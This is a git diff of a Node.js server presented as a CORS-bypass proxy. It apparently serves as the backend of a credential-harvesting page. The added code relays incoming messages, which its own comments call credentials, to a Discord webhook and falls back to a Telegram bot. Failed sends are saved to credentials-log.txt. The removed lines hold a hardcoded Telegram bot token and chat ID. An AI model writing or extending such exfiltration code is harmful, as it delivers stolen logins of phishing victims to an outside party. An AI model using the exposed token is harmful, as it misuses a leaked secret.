@@ -1,10 +1,12 @@
 // Simple Node.js server to proxy Telegram requests and bypass CORS
 const http = require('http');
 const https = require('https');
-
-const PORT = 8000;
 const fs = require('fs');
 const path = require('path');
+const telegramAPI = require('./api/telegram');
+const discordAPI = require('./api/discord');
+
+const PORT = 8000;
 
 // Function to save credentials to file as backup
 function saveToFile(message, reason) {
@@ -32,7 +34,63 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Handle Telegram proxy requests
+    // Handle Discord webhook requests (primary method)
+    if (req.url === '/discord-proxy' && req.method === 'POST') {
+        console.log('\n📨 Received Discord request at', new Date().toLocaleString());
+        let body = '';
+        
+        req.on('data', chunk => {
+            body += chunk.toString();
+        });
+        
+        req.on('end', async () => {
+            let headersSent = false;
+            
+            const sendResponse = (statusCode, data) => {
+                if (!headersSent) {
+                    headersSent = true;
+                    res.writeHead(statusCode, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify(data));
+                }
+            };
+            
+            try {
+                const data = JSON.parse(body);
+                const message = data.message || '';
+                
+                console.log('📝 Message to send:', message.substring(0, 100) + '...');
+                console.log('🔗 Using JavaScript Discord module...');
+                
+                // Use the JavaScript Discord module
+                try {
+                    console.log('🔗 Calling Discord API...');
+                    const result = await discordAPI.sendToDiscordAPI(message);
+                    console.log('✅ SUCCESS! Message sent to Discord!');
+                    console.log('📊 Response:', JSON.stringify(result));
+                    sendResponse(200, { ok: true, result: result });
+                } catch (discordError) {
+                    console.error('❌ Discord API Error:', discordError);
+                    console.error('❌ Error details:', JSON.stringify(discordError, null, 2));
+                    
+                    // Save to file as backup
+                    saveToFile(message, 'discord_error');
+                    
+                    sendResponse(500, { 
+                        ok: false, 
+                        error: discordError.error || discordError.message || 'Unknown error',
+                        hint: 'Credentials saved to credentials-log.txt as backup',
+                        details: discordError
+                    });
+                }
+                
+            } catch (error) {
+                console.error('❌ Error processing request:', error.message);
+                sendResponse(400, { ok: false, error: error.message });
+            }
+        });
+    }
+    
+    // Handle Telegram proxy requests using JavaScript module (fallback)
     if (req.url === '/telegram-proxy' && req.method === 'POST') {
         console.log('\n📨 Received Telegram request at', new Date().toLocaleString());
         let body = '';
@@ -41,107 +99,34 @@ const server = http.createServer((req, res) => {
             body += chunk.toString();
         });
         
-        req.on('end', () => {
+        req.on('end', async () => {
             try {
                 const data = JSON.parse(body);
                 const message = data.message || '';
                 
                 console.log('📝 Message to send:', message.substring(0, 100) + '...');
+                console.log('🔗 Using JavaScript Telegram module...');
                 
-                // Telegram Bot Configuration
-                const botToken = '8542135345:AAGbOxP43aqCelD3U0RJQOgb5DxrqdvAi8g';
-                const chatId = '6500739596';
-                
-                // Send to Telegram
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const postData = JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                });
-                
-                console.log('🔗 Sending to Telegram API...');
-                
-                const options = {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Content-Length': Buffer.byteLength(postData)
-                    },
-                    timeout: 10000 // 10 second timeout
-                };
-                
-                let headersSent = false;
-                
-                const sendError = (errorMsg, hint) => {
-                    if (!headersSent) {
-                        headersSent = true;
-                        res.writeHead(500, { 'Content-Type': 'application/json' });
-                        res.end(JSON.stringify({ 
-                            ok: false, 
-                            error: errorMsg,
-                            hint: hint
-                        }));
-                    }
-                };
-                
-                const telegramReq = https.request(telegramUrl, options, (telegramRes) => {
-                    let telegramData = '';
-                    
-                    console.log('📡 Telegram API Response Status:', telegramRes.statusCode);
-                    
-                    telegramRes.on('data', (chunk) => {
-                        telegramData += chunk;
-                    });
-                    
-                    telegramRes.on('end', () => {
-                        if (!headersSent) {
-                            headersSent = true;
-                            try {
-                                const responseData = JSON.parse(telegramData);
-                                if (responseData.ok) {
-                                    console.log('✅ SUCCESS! Message sent to Telegram!');
-                                    console.log('📱 Check your Telegram bot: @Qqqcccb_bot');
-                                } else {
-                                    console.error('❌ Telegram API Error:', responseData);
-                                }
-                                res.writeHead(200, { 'Content-Type': 'application/json' });
-                                res.end(telegramData);
-                            } catch (parseError) {
-                                console.error('❌ Error parsing Telegram response:', parseError);
-                                res.writeHead(200, { 'Content-Type': 'application/json' });
-                                res.end(telegramData);
-                            }
-                        }
-                    });
-                });
-                
-                telegramReq.on('error', (error) => {
-                    console.error('❌ Network Error connecting to Telegram:', error.message);
-                    console.error('💡 This might mean:');
-                    console.error('   1. Internet connection issue');
-                    console.error('   2. Telegram API is blocked in your country');
-                    console.error('   3. Firewall blocking the connection');
+                // Use the JavaScript Telegram module
+                try {
+                    const result = await telegramAPI.sendToTelegramAPI(message);
+                    console.log('✅ SUCCESS! Message sent to Telegram!');
+                    console.log('📱 Check your Telegram bot: @Qqqcccb_bot');
+                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ ok: true, result: result.data }));
+                } catch (telegramError) {
+                    console.error('❌ Telegram API Error:', telegramError);
                     
                     // Save to file as backup
                     saveToFile(message, 'telegram_error');
                     
-                    sendError(error.message, 'Telegram API might be blocked. Credentials saved to file as backup.');
-                });
-                
-                telegramReq.on('timeout', () => {
-                    console.error('❌ Request timeout - Telegram API not responding');
-                    console.error('💾 Saving credentials to file as backup...');
-                    telegramReq.destroy();
-                    
-                    // Save to file as backup
-                    saveToFile(message, 'telegram_timeout');
-                    
-                    sendError('Request timeout', 'Telegram API is blocked. Credentials saved to credentials-log.txt');
-                });
-                
-                telegramReq.write(postData);
-                telegramReq.end();
+                    res.writeHead(500, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ 
+                        ok: false, 
+                        error: telegramError.error || telegramError.message,
+                        hint: 'Credentials saved to credentials-log.txt as backup'
+                    }));
+                }
                 
             } catch (error) {
                 console.error('❌ Error processing request:', error.message);
